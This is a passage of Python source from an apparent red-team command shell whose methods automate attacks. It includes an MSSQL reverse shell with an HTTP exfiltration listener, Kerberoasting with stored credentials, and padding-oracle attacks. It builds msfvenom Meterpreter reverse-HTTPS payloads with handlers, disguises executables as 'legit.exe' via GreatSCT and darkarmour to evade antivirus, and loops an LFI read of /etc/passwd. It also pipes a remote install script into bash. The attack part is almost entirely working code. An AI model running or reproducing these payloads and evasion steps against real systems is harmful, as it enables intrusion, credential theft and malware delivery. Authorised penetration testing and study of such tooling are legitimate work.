        self.logcsv(f"unicode_WAFbypass {payload} {obfuscated_payload}")
        print_msg(obfuscated_payload)

    @cmd2.with_category(exploitation_category)
    def do_sqli_mssql_test(self, line):
        """
        Initiates a reverse MSSQL shell by starting an HTTP server to handle incoming connections and exfiltrate data.

        This function does the following:
        1. Starts an HTTP server to listen for connections from the MSSQL server.
        2. Intercepts and decodes responses from the target server.
        3. Prompts the user to enter commands, sends them to the target, and displays the output.

        Parameters:
        line (str): Unused command argument from the cmd2 prompt.

        Returns:
        None
        """
        handler = SimpleHTTPRequestHandler
        handler.server_version = 'nginx'
        handler.sys_version = ''
        handler.error_message_format = 'not found'

        input("    [*] Port 80 needs to be free. Terminate the process listening on port 80. Press Enter to continue.: ")
        httpd = MyServer(('0.0.0.0', 80), handler)
        url = self.params["url"]
        lhost = self.params["lhost"]
        if line:
            url = line.strip()
        try:
            print_msg("Starting HTTP server on port 80")
            activate_server(httpd, url, lhost)
            httpd.serve_forever()
        except KeyboardInterrupt:
            print_error("Shutting down the server.")
        httpd.server_close()
        self.logcsv(f"sqli_mssql_test {url}")

    @cmd2.with_category(lateral_movement_category)
    def do_targetedKerberoas(self, line):
        """
        Executes the targetedKerberoast tool for extracting Kerberos service tickets.

        This function performs the following actions:
        1. Verifies the presence of the targetedKerberoast tool; if not installed, it clones the repository and installs dependencies.
        2. Prompts for parameters such as the domain, username, and other configurations required by targetedKerberoast.
        3. Executes the targetedKerberoast tool with specified options for obtaining "kerberoastable" hashes.

        Parameters:
        line (str): Command arguments specifying the user, domain, and options.
                    Expected format:
                        - domain user hash or password [optional parameters]

        Returns:
        None
        """
        path = os.getcwd()
        targetedKerberoast_git = "https://github.com/ShutdownRepo/targetedKerberoast.git"
        targetedKerberoast_path = os.path.join("external", ".exploit", "targetedKerberoast")
        targetedKerberoast_path = f"{path}/{targetedKerberoast_path}"

        if not os.path.exists(targetedKerberoast_path):
            print_warn("targetedKerberoast is not installed. Cloning and installing dependencies.")
            self.cmd(f"git clone {targetedKerberoast_git} {targetedKerberoast_path}")
            self.cmd(f"pip3 install -r {targetedKerberoast_path}/requirements.txt")
            print_msg("Installation completed.")

        rhost = self.params["rhost"]
        domain = self.params["domain"]
        username = input("    [!] Enter the target username (default: administrator): ").strip() or "administrator"
        dc_ip = input(f"    [!] Enter the Domain Controller IP for {domain} (e.g., {rhost}): ").strip() or rhost
        output_file = input(f"    [!] Enter the output filename for hashes (default: sessions/{rhost}_kerberoast_hashes.txt): ").strip() or f"sessions/{rhost}_kerberoast_hashes.txt"
        auth_choice = input("    [!] Authenticate using password or hash (default: password): ").strip().lower() or "password"
        if auth_choice == "password":

            credentials = get_credentials()

            if not credentials:
                password = input(f"    [!] Enter password for {username}@{domain}: ").strip()
                auth_param = f"-p '{password}'"
            else:
                for user, password in credentials:
                    auth_param = f"-p '{password}'"
        else:
            hashis = get_hash()
            auth_param = f"-H '{hashis}'"

        verbosity = input("    [!] Set verbosity level (1 for verbose, 2 for debug, default: quiet): ").strip() or "quiet"
        verbosity_param = "-q" if verbosity == "quiet" else "-v" * int(verbosity)
        targetedKerberoast_command = (
            f"python3 {targetedKerberoast_path}/targetedKerberoast.py -v - -d {domain} -u {username} "
            f"{auth_param} --dc-ip {dc_ip} -o {output_file} {verbosity_param}"
        )
        print_msg(f"Running targetedKerberoast with command: {targetedKerberoast_command}")
        self.cmd(targetedKerberoast_command)
        self.logcsv(f"targetedKerberoast {targetedKerberoast_command}")
        return

    @cmd2.with_category(exploitation_category)
    def do_pyoracle2(self, line):
        """
        Executes the pyOracle2 tool for performing padding oracle attacks.

        This function performs the following actions:
        1. Verifies the presence of the pyOracle2 tool; if not installed, it clones the repository and installs dependencies.
        2. Prompts the user for configuration parameters or retrieves them from self.params to create a job-specific configuration file.
        3. Executes the pyOracle2 tool using the generated configuration file and specified options.

        Parameters:
        line (str): Command arguments specifying additional tool options if required.
                    Expected format: [optional parameters]

        Returns:
        None
        """
        path = os.getcwd()
        pyoracle_git = "https://github.com/liquidsec/pyOracle2.git"
        pyoracle_path = os.path.join("external", ".exploit", "pyOracle2")
        pyoracle_path = f"{path}/{pyoracle_path}"

        if not os.path.exists(pyoracle_path):
            print_warn("pyOracle2 is not installed. Cloning and installing dependencies.")
            self.cmd(f"git clone {pyoracle_git} {pyoracle_path}")
            self.cmd(f"pip3 install -r {pyoracle_path}/requirements.txt")
            print_msg("Installation completed.")

        target_url = self.params["url"]
        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        domain = self.params["domain"]
        subdomain = self.params["subdomain"]
        proxy_enabled = self.params.get("proxy_enabled", True)
        proxy_ip = self.params.get("proxy_ip", "127.0.0.1")
        proxy_port = self.params.get("proxy_port", "8080")
        input_data = input("Enter the Input data: ")
        mode = input("Enter the mode decrypt/encrypt: ") or 'decrypt'
        restore_file = self.params.get("restore", None)
        debug = self.params.get("debug", False)

        config_content = f"""
        [default]

        name = PyOracle Job
        URL = {target_url}
        httpMethod = GET
        postFormat = x-www-form-urlencoded
        inputMode = cookie
        encodingMode = base64
        vulnerableParameter = auth
        additionalParameters = {{}}
        blocksize = 8
        httpProxyOn = {str(proxy_enabled).lower()}
        httpProxyIp = {proxy_ip}
        httpProxyPort = {proxy_port}
        headers = {{"User-Agent":"Mozilla/5.0","Content-Type":"application/json"}}
        cookies = {{}}
        ivMode = firstblock
        oracleMode = negative
        oracleText = Invalid padding
        """.replace("        ",'')

        config_path = os.path.join(pyoracle_path, "pyoracle_config.ini")
        with open(config_path, "w") as config_file:
            config_file.write(config_content)

        pyoracle_command = f"python3 {pyoracle_path}/pyOracle2.py -c {config_path}"
        if restore_file:
            pyoracle_command += f" -r {restore_file}"
        if input_data:
            pyoracle_command += f" -i {input_data}"
        if mode:
            pyoracle_command += f" -m {mode}"
        if debug:
            pyoracle_command += " -d"

        print_msg(f"Running pyOracle2 with command: {pyoracle_command}")
        self.cmd(pyoracle_command)
        self.logcsv(f"pyoracle2 {pyoracle_command}")
        return

    @cmd2.with_category(persistence_category)
    def do_paranoid_meterpreter(self, line):
        """
        Creates and deploys a paranoid Meterpreter payload and listener with SSL/TLS pinning and UUID tracking.

        This function performs the following actions:
        1. Generates a self-signed SSL/TLS certificate for payload encryption.
        2. Creates either staged or stageless Meterpreter payloads with UUID tracking and TLS pinning.
        3. Configures and launches a Metasploit listener for the payload.

        Parameters:
        line (str): Command arguments specifying target configurations.
                    Expected format:
                        - rhost lhost domain subdomain

        Returns:
        None
        """
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        domain = self.params["domain"]
        subdomain = self.params["subdomain"]

        cert_name = f"sessions/{subdomain}.{domain}"
        print_msg(f"Creating SSL certificate for {cert_name}")
        cert_command = (
            f"openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 "
            f"-subj '/C=US/ST=Texas/L=Austin/O=Development/CN={subdomain}.{domain}' "
            f"-keyout {cert_name}.key -out {cert_name}.crt && "
            f"cat {cert_name}.key {cert_name}.crt > {cert_name}.pem && "
            f"rm -f {cert_name}.key {cert_name}.crt"
        )
        print_msg(cert_command)
        self.cmd(cert_command)
        if not line:
            choice = input("Would you like a staged or stageless payload? (Enter 'staged' or 'stageless'): ").strip().lower()
        else:
            choice = line.strip()

        if choice == 'staged':
            staged_payload_command = (
                f"msfvenom -p windows/meterpreter/reverse_winhttps LHOST={lhost} LPORT={lport} "
                f"PayloadUUIDTracking=true HandlerSSLCert=./{cert_name}.pem "
                f"StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH "
                f"-f exe -o sessions/launch-paranoid.exe && upx sessions/launch-paranoid.exe"
            )
            print_msg(f"Generating staged Meterpreter payload for {lhost}")
            print_msg(staged_payload_command)
            self.cmd(staged_payload_command)

            listener_staged_command = (
                f"msfconsole -q -x 'use exploit/multi/handler; "
                f"set PAYLOAD windows/meterpreter/reverse_winhttps; "
                f"set LHOST {lhost}; set LPORT {lport}; set HandlerSSLCert ./{cert_name}.pem; "
                f"set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'"
            )
            print_msg("Starting Metasploit listener for staged payload")
            print_msg(listener_staged_command)
            self.cmd(listener_staged_command)
            self.logcsv(f"paranoid_meterpreter {listener_staged_command}")
        elif choice == 'stageless':
            stageless_payload_command = (
                f"msfvenom -p windows/meterpreter_reverse_https LHOST={lhost} LPORT={lport} "
                f"PayloadUUIDTracking=true HandlerSSLCert=./{cert_name}.pem "
                f"StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless "
                f"-f exe -o sessions/launch-paranoid-stageless.exe && upx sessions/launch-paranoid-stageless.exe"
            )
            print_msg(f"Generating stageless Meterpreter payload for {lhost}")
            print_msg(stageless_payload_command)
            self.cmd(stageless_payload_command)

            listener_stageless_command = (
                f"msfconsole -q -x 'use exploit/multi/handler; "
                f"set PAYLOAD windows/meterpreter_reverse_https; "
                f"set LHOST {lhost}; set LPORT {lport}; set HandlerSSLCert ./{cert_name}.pem; "
                f"set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'"
            )
            print_msg("Starting Metasploit listener for stageless payload")
            print_msg(listener_stageless_command)
            self.cmd(listener_stageless_command)
            self.logcsv(f"paranoid_meterpreter {listener_stageless_command}")
        else:
            print_msg("Invalid choice. Please enter 'staged' or 'stageless'.")
            return

        print_msg("Paranoid Meterpreter payload and listener created successfully.")
        return

    @cmd2.with_category(exploitation_category)
    def do_lfi(self, line):
        """
        Exploits a potential Local File Inclusion (LFI) vulnerability by crafting
        and sending HTTP GET requests to a specified URL.

        The user can specify the target URL directly via the `line` parameter or
        provide it interactively. If no URL is provided, the method uses a default
        value stored in `self.params["url"]`. Users are then prompted to specify
        the file to retrieve from the server, defaulting to `/etc/passwd`.

        Args:
            line (str): Optional URL input provided directly in the command line.
                        If not supplied, a default URL from `self.params["url"]`
                        will be used.

        Behavior:
            - Continuously prompts the user to specify a file to fetch via the
            target LFI vulnerability.
            - Sends a GET request to the constructed URL and prints the server's
            response to the console.
            - Allows users to inspect different files on the target server by
            modifying the file path interactively.
        """
        url = self.params["url"]
        if line:
            url = line.strip()

        url = input(f"    [!] Enter url (default {url}): ") or url
        start = f"{YELLOW}    [*] Start Lazy Lfi Scanning...\n {RESET}"
        for s in start:
            sys.stdout.write(s)
            sys.stdout.flush()
            time.sleep(0.1)
        self.logcsv(f"lfi {url}")
        while True:
            file = input(f"   [!] Enter file (default /etc/passwd): ") or '/etc/passwd'
            url = f"{url}{file}"
            print_msg(url)
            r = requests.get(url)
            print_msg(r.text)

    @cmd2.with_category(exploitation_category)
    def do_greatSCT(self, line):
        """
        Executes the GreatSCT tool for generating payloads that bypass antivirus and application whitelisting solutions.

        This function performs the following actions:
        1. Verifies the presence of the GreatSCT tool; if not installed, it clones the repository and installs dependencies.
        2. Configures and generates the payload using user-provided or default parameters.
        3. Executes the GreatSCT tool with the specified options.

        Parameters:
        line (str): Command arguments specifying additional tool options if required.
                    Expected format: [--ip <IP> --port <PORT> --tool <TOOL> --payload <PAYLOAD>]

        Returns:
        None
        """
        path = os.getcwd()
        greatsct_git = "https://github.com/GreatSCT/GreatSCT.git"
        greatsct_path = os.path.join("external", ".exploit", "GreatSCT")
        greatsct_path = f"{path}/{greatsct_path}"

        if not os.path.exists(greatsct_path):
            print_warn("GreatSCT is not installed. Cloning and setting up dependencies.")
            self.cmd(f"git clone {greatsct_git} {greatsct_path}")
            self.cmd(f"cd {greatsct_path}/setup && sudo ./setup.sh -c")
            print_msg("GreatSCT installation completed.")

        lhost = self.params["lhost"]
        lport = self.params["lport"]
        tool = "Bypass"
        payload = "installutil/powershell/script.py"
        obfuscation = "ascii"
        script_path = f"{path}/sessions/script.ps1"

        greatsct_command = (
            f"python3 {greatsct_path}/GreatSCT.py --ip {lhost} --port {lport} "
            f"-t {tool} -p {payload} -c \"OBFUSCATION={obfuscation} SCRIPT={script_path}\""
        )

        print_msg(f"Running GreatSCT with command: {greatsct_command}")
        self.cmd(greatsct_command)
        self.logcsv(f"greatsct {greatsct_command}")
        return

    @cmd2.with_category(exploitation_category)
    def do_sqsh(self, line):
        """
        Executes the Impacket sqsh tool for manipulating ownership of Active Directory objects.

        This function performs the following actions:
        1. Prompts the user for necessary parameters if not provided.
        2. Executes the command to change the owner of a specified target in Active Directory.

        The command accepts the following parameters:
        - New owner (user) for the target object.
        - Target object to be manipulated.
        - Domain credentials for authentication.
        - DC IP address for the domain controller.

        Parameters:
        line (str): Command argument specifying the new owner and target options.
                    Expected format:
                        - -new-owner NEW_OWNER for the new owner
                        - -target TARGET_OBJECT for the target object
                        - Required flags for authentication and connection

        Returns:
        None
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]

        credentials_path = f"{os.getcwd()}/sessions/credentials.txt"

        if not os.path.exists(credentials_path):
            print_error("Need credentials to use this option. Use: createcredentials admin:admin")
            return

        credentials = get_credentials()
        if not credentials:
            return

        for user, passwd in credentials:
            command = f"sqsh -S {rhost} -U {user} -P {passwd}"
            print_msg(command)
            self.cmd(command)
            self.logcsv(f"sqsh {command}")
        return

    @cmd2.with_category(persistence_category)
    def do_setoolKits(self, line):
        """
        Executes the SEToolKit workflow to generate a Meterpreter payload
        and configure the multi-handler using LHOST and LPORT from self.params.

        Usage:
            do_setoolKits

        Arguments:
            None: LHOST and LPORT are retrieved from self.params.

        Workflow:
            1. Launches SEToolKit.
            2. Navigates to option 1 (Social-Engineering Attacks).
            3. Selects option 9 (Powershell Alphanumeric Shellcode Injector).
            4. Configures LHOST and LPORT using values from self.params.
            5. Generates a Meterpreter reverse HTTPS payload.
            6. Configures a multi-handler to listen for incoming connections.
        """
        try:
            lhost = self.params["lhost"]
            lport = self.params["lport"]

            if not lhost or not lport:
                raise ValueError("LHOST and LPORT must be specified in self.params")

            print_msg(f"[*] SEToolKit configuring payload with LHOST={lhost} and LPORT={lport}.")
            self.cmd("sudo setoolkit -q")
            self.logcsv(f"setoolKits setoolkit -q")
        except Exception as e:
            print_error(f"[!] Error: {e}")

    @cmd2.with_category(exploitation_category)
    def do_jwt_tool(self, line):
        """
        Uses the jwt_tool to analyze, tamper, or exploit JSON Web Tokens (JWTs).

        This function performs the following actions:
        1. Verifies the presence of jwt_tool; if not installed, it clones the repository and installs dependencies.
        2. Accepts a JWT token as input or uses the provided argument for analysis.
        3. Executes jwt_tool with the specified options and prints the results.

        Parameters:
        line (str): Command argument containing a JWT token to analyze. If not provided, prompts the user for a token.

        Returns:
        None
        """
        path = os.getcwd()
        jwt_tool_git = "https://github.com/ticarpi/jwt_tool.git"
        jwt_tool_path = os.path.join("external", ".exploit", "jwt_tool")
        jwt_tool_path = f"{path}/{jwt_tool_path}"

        if not os.path.exists(jwt_tool_path):
            print_warn("jwt_tool is not installed. Cloning the repository and installing dependencies.")
            self.cmd(f"git clone {jwt_tool_git} {jwt_tool_path}")
            self.cmd(f"python3 -m pip3 install -r {jwt_tool_path}/requirements.txt")
            print_msg("jwt_tool installation completed.")

        jwt_token = line.strip() if line else input("Enter the JWT token: ").strip()

        jwt_tool_command = f"python3 {jwt_tool_path}/jwt_tool.py {jwt_token}"

        print_msg(f"Running jwt_tool with command: {jwt_tool_command}")
        self.cmd(jwt_tool_command)
        choice = input("    [?] Do you want try add another cookie (you must 'intercept on' in burp suit)? (y/n)") or 'n'
        if choice == 'y':
            rhost = self.params["rhost"]
            jwt_tool_command = f"python3 {jwt_tool_path}/jwt_tool.py -t http://{rhost}/ -rc \"jwt={jwt_token};anothercookie=grisun0\" -M pb"
            print_msg(f"Running jwt_tool with command: {jwt_tool_command}")
            self.cmd(jwt_tool_command)
        self.logcsv(f"jwt_tool {jwt_tool_command}")
        return

    @cmd2.with_category(persistence_category)
    def do_darkarmour(self, line):
        """
        Uses the darkarmour tool to generate an undetectable version of a PE executable.

        This function performs the following actions:
        1. Verifies the presence of darkarmour; if not installed, it clones the repository and installs dependencies.
        2. Prompts the user for various options to customize the tool's behavior.
        3. Constructs a command to run darkarmour with the selected options.
        4. Executes darkarmour to generate the output file with the desired level of obfuscation.

        Parameters:
        line (str): Command line arguments for the tool.

        Returns:
        None
        """
        path = os.getcwd()
        sessions = f"{path}/sessions"
        darkarmour_git = "https://github.com/bats3c/darkarmour.git"
        darkarmour_path = os.path.join("external", ".exploit", "darkarmour")
        darkarmour_path = f"{path}/{darkarmour_path}"

        if not os.path.exists(darkarmour_path):
            print_warn("darkarmour is not installed. Cloning the repository and installing dependencies.")
            self.cmd(f"git clone {darkarmour_git} {darkarmour_path}")
            self.cmd(f"sudo apt install mingw-w64-tools mingw-w64-common g++-mingw-w64 gcc-mingw-w64 upx-ucl osslsigncode")
            print_msg("darkarmour installation completed.")


        file_input = input(f"    [!] Enter file to encrypt (default: 'sessions/shell64.exe'): ") or f"{sessions}/shell64.exe"
        encryption_method = input(f"    [!] Enter encryption method (default: 'xor'): ") or "xor"
        shellcode_file = input(f"    [!] Enter shellcode file (default: None): ") or None
        is_binary = input(f"    [!] Is the file a binary executable (default: 'yes')? (y/n): ") or "y"
        use_dll = input(f"    [!] Use reflective DLL injection (default: 'no')? (y/n): ") or "n"
        pack_upx = input(f"    [!] Pack the executable with UPX (default: 'yes')? (y/n): ") or "y"
        use_jmp = input(f"    [!] Use JMP-based PE loader (default: 'yes')? (y/n): ") or "y"
        use_runpe = input(f"    [!] Use RUNPE to load PE (default: 'no')? (y/n): ") or "n"
        is_source = input(f"    [!] Is the file C source code (default: 'no')? (y/n): ") or "n"
        encryption_key = input(f"    [!] Enter encryption key (default: None): ") or None
        loop_count = input(f"    [!] Enter number of encryption levels (default: '5'): ") or "5"
        output_file = input(f"    [!] Enter output file name (default: 'sessions/legit.exe'): ") or f"{sessions}/legit.exe"

        darkarmour_command = f"cd {darkarmour_path} && python3 {darkarmour_path}/darkarmour.py -f {file_input} --encrypt {encryption_method} "

        if shellcode_file:
            darkarmour_command += f"--shellcode {shellcode_file} "
        if is_binary.lower() == "y":
            darkarmour_command += "--binary "
        if use_dll.lower() == "y":
            darkarmour_command += "--dll "
        if pack_upx.lower() == "y":
            darkarmour_command += "--upx "
        if use_jmp.lower() == "y":
            darkarmour_command += "--jmp "
        if use_runpe.lower() == "y":
            darkarmour_command += "--runpe "
        if is_source.lower() == "y":
            darkarmour_command += "--source "
        if encryption_key:
            darkarmour_command += f"--key {encryption_key} "
        darkarmour_command += f"--loop {loop_count} -o {output_file}"

        print_msg(f"Running darkarmour with command: {darkarmour_command}")
        self.cmd(darkarmour_command)
        self.logcsv(f"darkarmour {darkarmour_command}")
        return

    @cmd2.with_category(scanning_category)
    def do_osmedeus(self, line):
        """
        Executes Osmedeus scans with guided input for various scanning scenarios.

        This function performs the following actions:
        1. Verifies the presence of Osmedeus; if not installed, it clones the repository
        and installs the required dependencies.
        2. Guides the user through selecting the type of scan, target, and any additional
        parameters needed for the scan.
        3. Constructs and executes the appropriate Osmedeus command.

        Parameters:
        line (str): Command-line arguments for the tool. If not provided, interactive
                    input will be used.

        Returns:
        None
        """
        path = os.getcwd()
        osmedeus_path = os.path.join("external", ".exploit", "osmedeus")
        osmedeus_path = f"{path}/{osmedeus_path}"
        osmedeus_repo = "https://github.com/j3ssie/osmedeus.git"
        go_install_cmd = 'bash -c "bash <(curl -fsSL https://raw.githubusercontent.com/osmedeus/osmedeus-base/master/install.sh)"'

        if not os.path.exists(osmedeus_path):
            print_warn("Osmedeus is not installed. Cloning the repository and installing dependencies.")
            self.cmd(f"git clone {osmedeus_repo} {osmedeus_path}")
            os.chdir(osmedeus_path)
            self.cmd(go_install_cmd)
            print_msg("Osmedeus installation completed.")
            os.chdir(path)

        scan_types = {
            "1": "general (default reconnaissance workflow)",
            "2": "extensive (in-depth analysis)",
            "3": "vuln (vulnerability scan)",
            "4": "fast (quick summary scan)",
            "5": "subdomain-enum (subdomain enumeration only)",
            "6": "extensive-vuln (extensive vulnerability scan)",
            "7": "repo-scan (static vulnerability and secret scan on repositories)",
            "8": "cidr (scan for CIDR ranges)"
        }

        print_msg("Select the type of scan to perform:")
        for key, description in scan_types.items():
            print_msg(f"  {key}. {description}")

        scan_choice = input("    [!] Enter the number corresponding to your choice (default: 1): ").strip() or "1"
        flow = scan_types.get(scan_choice, "general").split()[0]
        domain = self.params["domain"]
        url = self.params["url"]
        target = input(f"    [!] Enter the target (e.g., {domain}, list_of_targets.txt): ").strip() or domain
        if not target:
            print_warn("A target is required to execute the scan.")
            return

        additional_params = ""
        if flow in ["cidr", "repo-scan"]:
            if flow == "cidr":
                additional_params = input("    [!] Enter CIDR format (e.g., 1.2.3.4/24) or leave empty for file input: ").strip()
            elif flow == "repo-scan":
                additional_params = input(f"    [!] Enter the repository URL {url} or folder path: ").strip() or url

        osmedeus_command = f"osmedeus scan -f {flow} -t {target} {additional_params}".strip()
        print_msg(f"Executing Osmedeus with command: {osmedeus_command}")
        self.cmd(osmedeus_command)
        self.logcsv(f"osmedeus {osmedeus_command}")
        os.chdir(path)
        return

    @cmd2.with_category(recon_category)
    def do_metabigor(self, line):
        """
        Executes Metabigor commands for OSINT and scanning tasks with guided input or predefined arguments.

        This function performs the following actions:
        1. Verifies the presence of Metabigor; if not installed, it clones the repository and installs the required dependencies.
        2. Guides the user through selecting the type of task (IP discovery, related domains, scan, etc.), target, and additional parameters.
        3. Constructs and executes the appropriate Metabigor command based on the user's input or the provided argument.

        Parameters:
        line (str): Command-line arguments for Metabigor. If not provided, interactive input will be used.

        Returns:
        None
        """
        path = os.getcwd()
        metabigor_path = os.path.join("external", ".exploit", "metabigor")
        metabigor_path = f"{path}/{metabigor_path}"
        metabigor_repo = "https://github.com/j3ssie/metabigor.git"
        rhost = self.params["rhost"]
        if not os.path.exists(metabigor_path):
            print_warn("Metabigor is not installed. Cloning the repository and installing dependencies.")
            self.cmd(f"git clone {metabigor_repo} {metabigor_path}")
            os.chdir(metabigor_path)
            self.cmd("go install")
            print_msg("Metabigor installation completed.")
            os.chdir(path)

        if line:
            echo_command = f'echo "{line}" | metabigor net --org -o {path}/sessions/result_{line}.txt'
            print_msg(f"Executing Metabigor with command: {echo_command}")
            self.cmd(echo_command)
            return

        task_types = {
            "1": "Discovery IP of a company/organization",
            "2": "Discovery IP of an ASN",
            "3": "Find related domains using certificate info",
            "4": "Run scan with rustscan, masscan, or nmap",
            "5": "Get IP address summary",
            "6": "Extract Shodan IPInfo"
        }

        print_msg("Select the type of task to perform:")
        for key, description in task_types.items():
            print_msg(f"  {key}. {description}")

        task_choice = input("    [!] Enter the number corresponding to your choice (default: 1): ").strip() or "1"
        task = task_types.get(task_choice, "1")

        if task == "Discovery IP of a company/organization":
            target = input("    [!] Enter the organization name: ").strip()
            command = f"echo \"{target}\" | metabigor net --org -o {path}/sessions/result_{target}.txt"
        elif task == "Discovery IP of an ASN":
            target = input("    [!] Enter the ASN: ").strip()
            command = f"echo \"{target}\" | metabigor net --asn -o {path}/sessions/result_{target}.txt"
        elif task == "Find related domains using certificate info":
            target = input("    [!] Enter the company/organization name: ").strip()
            command = f"echo \"{target}\" | metabigor related -s 'cert' -o {path}/sessions/result_{target}.txt"
        elif task == "Run scan with rustscan, masscan, or nmap":
            target = input(f"    [!] Enter the target IP/CIDR (e.g., {rhost}/24: ").strip() or f"{rhost}/24"
            command = f"echo \"{target}\" | metabigor scan -o {path}/sessions/result_{target}.txt"
        elif task == "Get IP address summary":
            target = input(f"    [!] Enter the IP address {rhost}: ").strip() or rhost
            command = f"echo \"{target}\" | metabigor ipc --json -o {path}/sessions/result_{target}.txt"
        elif task == "Extract Shodan IPInfo":
            target = input(f"    [!] Enter the IP address: {rhost}: ").strip() or rhost
            command = f"echo \"{target}\" | metabigor ip -open -o {path}/sessions/result_{target}.txt"

        print_msg(f"Executing Metabigor with command: {command}")
        self.cmd(command)
        self.logcsv(f"metabigor {command}")
        os.chdir(path)
        return

    @cmd2.with_category(miscellaneous_category)
    def do_ip2asn(self, line):
        """Command to get ASN for a given IP address."""
        path = os.getcwd()
        file = f"{path}/sessions/ip2asn-v4.tsv.gz"

        url = "https://github.com/pl-strflt/iptoasn/raw/main/data/ip2asn-v4.tsv.gz"
        if not os.path.exists(file):
            command = f"curl -o {file} {url}"
            self.cmd(command)
        self.ip2asn.open_file(file)
        rhost = self.params["rhost"]

        if line:
            target = line.strip()
        else:
            print_warn("Usage: ip2asn <IP>")
            target = rhost

        ip = target
        asn = self.ip2asn.as_of_ip(ip)
        if asn == 0:
            print_warn(f"IP {ip} not found in any ASN records.")
        else:

            as_name = self.ip2asn.as_name.get(asn, "Unknown")
            as_country = self.ip2asn.as_country.get(asn, "Unknown")
            print_msg(f"IP {ip} is part of ASN {asn} ({as_name}, {as_country})")
        self.logcsv(f"ip2asn {line}")

    @cmd2.with_category(command_and_control_category)
    def do_atomic_tests(self, line):
        """
        Executes Atomic Red Team tests based on user-selected platform and test.

        This function performs the following actions:
        1. Verifies the presence of the Atomic Red Team repository; if not present, it clones it locally.
        2. Prompts the user to select a target platform, filtering the available tests to only those compatible.
        3. Displays the filtered tests, including their description and platform compatibility.
        4. Allows the user to select and execute a test or specify parameters directly.

        Parameters:
        line (str): Command-line arguments for specifying a test ID or additional parameters.
                    If not provided, interactive input will be used.

        Returns:
        None
        """
        atomic_repo = "https://github.com/redcanaryco/atomic-red-team.git"
        atomic_path = os.path.join("external", ".exploit", "atomic-red-team")
        atomic_yaml_path = os.path.join(atomic_path, "atomics")
        path = os.getcwd()
        credentials = f"{path}/sessions/credentials.txt"
        if not os.path.exists(atomic_path):
            print_warn("Atomic Red Team repository not found. Cloning...")
            self.cmd(f"git clone {atomic_repo} {atomic_path}")
            print_msg("Repository cloned successfully.")
        else:
            command = f"cd {atomic_path} && git pull"
            print_msg("Try to update...")
            self.cmd(command)

        print_msg("Select the platform to target:")
        platforms = ['windows', 'macos', 'linux', 'office-365', 'azure-ad', 'google-workspace', 'saas', 'iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp']
        for idx, platform in enumerate(platforms, 1):
            print_msg(f"    {idx}. {platform}")

        try:
            platform_choice = int(input("    [!] Enter the number of the platform to target: ").strip())
            selected_platform = platforms[platform_choice - 1]
        except (ValueError, IndexError):
            print_warn("Invalid platform selection.")
            return

        yaml_files = glob.glob(os.path.join(atomic_yaml_path, "**", "*.yaml"), recursive=True)
        tests = {}
        for file in yaml_files:
            with open(file, "r") as f:
                data = yaml.safe_load(f)
                if "atomic_tests" in data:
                    for test in data["atomic_tests"]:
                        if selected_platform in test.get("supported_platforms", []):
                            tests[test["auto_generated_guid"]] = {
                                "name": test["name"],
                                "description": test.get("description", "No description available"),
                                "platforms": test.get("supported_platforms", []),
                                "command": test.get("executor", {}).get("command", "No command available"),
                                "prereq_command": test.get("dependencies", [{}])[0].get("prereq_command", ""),
                                "get_prereq_command": test.get("dependencies", [{}])[0].get("get_prereq_command", ""),
                                "cleanup_command": test.get("executor", {}).get("cleanup_command", ""),
                                "input_arguments": test.get("input_arguments", {}),
                                "mitre_id": data.get("attack_technique", "No MITRE ID available")
                            }

        if not tests:
            print_warn(f"No tests available for the selected platform: {selected_platform}")
            return

        if line:
            test_id = line.strip()
            selected_test = tests.get(test_id)
            if not selected_test:
                print_warn(f"Test ID {test_id} not found.")
                return
        else:
            print_msg(f"Available Atomic Red Team tests for {selected_platform}:")
            for idx, (test_id, test) in enumerate(tests.items(), 1):
                print_msg(f"{idx}. {test['name']} (Platforms: {', '.join(test['platforms'])}) Id: {test_id}")
            try:
                test_choice = int(input("    [!] Enter the number of the test to execute: ").strip())
                test_id = list(tests.keys())[test_choice - 1]
                selected_test = tests[test_id]
            except (ValueError, IndexError):
                print_warn("Invalid choice.")
                return

        mitre_url = selected_test['mitre_id'].replace(".","/")
        print_msg(f"Atomic ID: {test_id}")
        print_msg(f"Executing test: {selected_test['name']}")
        print_msg(f"Description: \n {selected_test['description']}")
        print_msg(f"Platforms: {', '.join(selected_test['platforms'])}")
        print_msg(f"MITRE ID: {selected_test['mitre_id']}")
        print_msg(f"MITRE url: https://attack.mitre.org/techniques/{mitre_url}")

        rhost = self.params["rhost"]
        domain = self.params["domain"]
        rport = self.params["rport"]
        input_arguments = selected_test['input_arguments']
        if not os.path.exists(credentials):
            if not username:
                print_error("Username not defined.")
                username = input("    [!] Enter the username: ")

            if not password:
                print_error("Password not defined.")
                password = input("    [!] Enter the password: ")
        else:
            credentials = get_credentials()
            if not credentials:
                return
            for usr, passwd in credentials:
                username = usr
                password = passwd

        variables = {
            "#{ip_address}": rhost,
            "#{endpoint_domain}": rhost,
            "#{username}": username,
            "#{password}": password,
            "#{domain}": domain,
            "#{port}": rport,
            "#{hostname}": domain
        }
        for key, value in input_arguments.items():
            formatted_key = "#{{key}}".replace("{key}",key)
            if formatted_key not in variables:
                variables[formatted_key] = value.get("default", "")

        prereq_command = selected_test["prereq_command"]
        prereq_command = replace_variables(prereq_command, variables)
        get_prereq_command = selected_test["get_prereq_command"]
        get_prereq_command = replace_variables(get_prereq_command, variables)
        command = selected_test["command"]
        command = replace_variables(command, variables)
        cleanup_command = selected_test["cleanup_command"]
        cleanup_command = replace_variables(cleanup_command, variables)

        if prereq_command:
            print_msg(f"Prerequisite command to execute: {prereq_command}")
            copy2clip(prereq_command)
            input("    [!] Press Enter after executing the prerequisite command...")

        if get_prereq_command:
            print_msg(f"Get prerequisite command to execute: {get_prereq_command}")
            copy2clip(get_prereq_command)
            input("    [!] Press Enter after executing the get prerequisite command...")

        print_msg(f"Command to execute: {command}")
        copy2clip(command)
        input("    [!] Press Enter after executing the command...")

        if cleanup_command:
            print_msg(f"Cleanup command to execute: {cleanup_command}")
            copy2clip(cleanup_command)
            input("    [!] Press Enter after executing the cleanup command...")
        self.logcsv(f"atomic_test {command}")
        print_msg("Test execution completed.")

